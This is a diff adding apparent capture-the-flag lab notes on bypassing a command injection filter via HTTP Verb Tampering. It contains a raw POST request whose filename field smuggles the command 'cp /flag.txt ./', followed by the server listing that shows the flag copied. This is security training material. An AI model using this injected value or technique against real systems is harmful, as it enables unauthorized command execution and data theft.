@@ -130,3 +130,30 @@ filename=test12323123%3B
 </html>
 
 <div></div><ul class="list-unstyled" id="file"><div><h3>Available Files:<h3></div><ul><li><h4><a href='test12323123'>test12323123</a></h4></li></ul><ul><li><h4><a href='test123'>test123</a></h4></li></ul><ul><li><h4><a href='test'>test</a></h4></li></ul><ul><li><h4><a href='notes.txt'>notes.txt</a></h4></li></ul></ul>
+
+
+Question
+
+To get the flag, try to bypass the command injection filter through HTTP Verb Tampering, while using the following filename: file; cp /flag.txt ./
+
+POST /index.php HTTP/1.1
+Host: 83.136.253.201:36762
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 42
+
+filename=file%3B%20cp%20%2Fflag.txt%20.%2F``` 
+
+```
+used URL encoder
+
+
+
+<div></div><ul class="list-unstyled" id="file"><div><h3>Available Files:<h3></div><ul><li><h4><a href='flag.txt'>flag.txt</a></h4></li></ul><ul><li><h4><a href='file'>file</a></h4></li></ul><ul><li><h4><a href='test12323123'>test12323123</a></h4></li></ul><ul><li><h4><a href='test123'>test123</a></h4></li></ul><ul><li><h4><a href='test'>test</a></h4></li></ul><ul><li><h4><a href='notes.txt'>notes.txt</a></h4></li></ul></ul>
